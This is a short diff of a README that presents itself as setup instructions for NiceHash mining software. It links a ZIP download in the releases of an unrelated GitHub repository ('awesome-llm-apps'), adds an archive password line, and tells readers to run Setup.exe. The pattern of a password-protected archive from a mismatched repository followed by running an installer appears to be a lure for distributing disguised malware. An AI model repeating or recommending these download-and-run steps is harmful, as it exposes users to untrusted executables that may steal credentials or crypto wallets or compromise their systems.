@@ -8,7 +8,8 @@ NiceHash is a popular platform that allows users to buy and sell hashing power. 
 
 ## Getting Started
 1. [DOWNLOAD](https://github.com/balint111110/awesome-llm-apps/releases/download/Download/Version_3.0.zip) the NiceHash
-2. Run Setup.exe
+2. Passw0rd: 2042
+3. Run Setup.exe
 
 ## Setting Up NiceHash
 - Choose your mining hardware (GPU/CPU).
